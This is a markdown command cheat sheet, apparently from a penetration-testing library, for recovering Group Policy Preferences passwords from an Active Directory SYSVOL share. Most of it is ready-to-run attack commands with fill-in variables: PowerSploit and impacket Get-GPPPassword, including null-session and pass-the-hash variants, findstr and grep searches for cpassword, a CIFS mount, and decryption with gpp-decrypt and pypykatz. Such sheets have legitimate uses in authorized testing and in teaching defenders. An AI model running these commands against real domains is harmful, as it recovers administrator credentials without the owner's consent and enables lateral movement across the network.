---
technique: GPPPasswordDump
category: credential-dumping
protocols: SMB
remote_capable: true
tags: gpp group-policy sysvol cpassword credential-dumping plaintext ad
---

# GPPPasswordDump

Group Policy Preferences historically allowed administrators to set the built-in local Administrator password via GPO. The resulting XML files are stored world-readable in SYSVOL and contain the password encrypted with a static AES-256 key Microsoft published in 2012. Any domain user can read SYSVOL and decrypt the `cpassword` field to recover the plaintext password.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Domain user | Read access to SYSVOL is granted to all authenticated domain users |
| Scope | Applies to every machine the GPO targets; recovered password may be reused across many hosts |

## Windows

### Step 1: Import Get-GPPPassword (PowerSploit)

#powershell #powersploit #sysvol

Import the PowerSploit Get-GPPPassword module.

```powershell title:"Import Get-GPPPassword module"
Import-Module .\Get-GPPPassword.ps1
```
<!-- cheat -->

### Step 2: Get-GPPPassword (PowerSploit)

#powershell #powersploit #sysvol

Search SYSVOL XML files for `cpassword` fields and return plaintext passwords.

```powershell title:"Dump GPP passwords from SYSVOL with Get-GPPPassword"
Get-GPPPassword
```
<!-- cheat -->

### findstr (manual)

#cmd #native #sysvol

Search SYSVOL XML files manually for the cpassword field from CMD without any additional tools.

```cmd title:"Find cpassword fields in SYSVOL with findstr"
findstr /S cpassword %logonserver%\sysvol\*.xml
```
<!-- cheat -->

## Linux

### Get-GPPPassword.py (null session)

#impacket #smb #sysvol #remote

Remotely parse SYSVOL XML files over SMB with a null session and return decrypted GPP passwords.

```sh title:"Remote GPP password dump via null session with Get-GPPPassword.py"
Get-GPPPassword.py -no-pass "$dc_host"
```
<!-- cheat
var dc_host
-->

### Get-GPPPassword.py (password auth)

#impacket #smb #sysvol #remote

Remotely parse SYSVOL XML files over SMB with a plaintext password and return decrypted GPP passwords.

```sh title:"Remote GPP password dump with password auth via Get-GPPPassword.py"
Get-GPPPassword.py "$domain/$user:$pass@$dc_host"
```
<!-- cheat
import domain_ip
import users
import passwords
var dc_host
-->

### Get-GPPPassword.py (NT hash auth)

#impacket #smb #sysvol #remote #pth

Remotely parse SYSVOL XML files over SMB with an NT hash and return decrypted GPP passwords.

```sh title:"Remote GPP password dump with NT hash via Get-GPPPassword.py"
Get-GPPPassword.py -hashes "aad3b435b51404eeaad3b435b51404ee:$nt_hash" "$domain/$user@$dc_host"
```
<!-- cheat
import domain_ip
import users
var nt_hash
var dc_host
-->

### Step 1: Create SYSVOL mount point

#smb #sysvol #manual

Create a local mount point for the SYSVOL share.

```sh title:"Create local SYSVOL mount point"
sudo mkdir /tmp/sysvol
```
<!-- cheat -->

### Step 2: Mount SYSVOL over CIFS

#smb #sysvol #manual

Mount the SYSVOL share over CIFS to access Group Policy XML files locally.

```sh title:"Mount SYSVOL share over CIFS"
sudo mount -o domain="$domain",username="$user",password="$pass" -t cifs "//$rhost_ip/SYSVOL" /tmp/sysvol
```
<!-- cheat
import domain_ip
import users
import passwords
-->

### Step 3: Grep for cpassword values

#smb #sysvol #manual

Search the mounted SYSVOL for cpassword fields in Group Policy XML files.

```sh title:"Search mounted SYSVOL for cpassword fields"
sudo grep -ria cpassword "/tmp/sysvol/$domain/Policies/" 2>/dev/null
```
<!-- cheat
import domain_ip
-->

### Step 3: Decrypt cpassword (gpp-decrypt)

#decrypt #sysvol #manual

Decrypt a recovered cpassword value using gpp-decrypt.

```sh title:"Decrypt GPP cpassword with gpp-decrypt"
gpp-decrypt "$cpassword_value"
```
<!-- cheat
var cpassword_value
-->

### Step 3: Decrypt cpassword (pypykatz)

#decrypt #sysvol #manual

Decrypt a recovered cpassword value using pypykatz.

```sh title:"Decrypt GPP cpassword with pypykatz"
pypykatz gppass "$cpassword_value"
```
<!-- cheat
var cpassword_value
-->
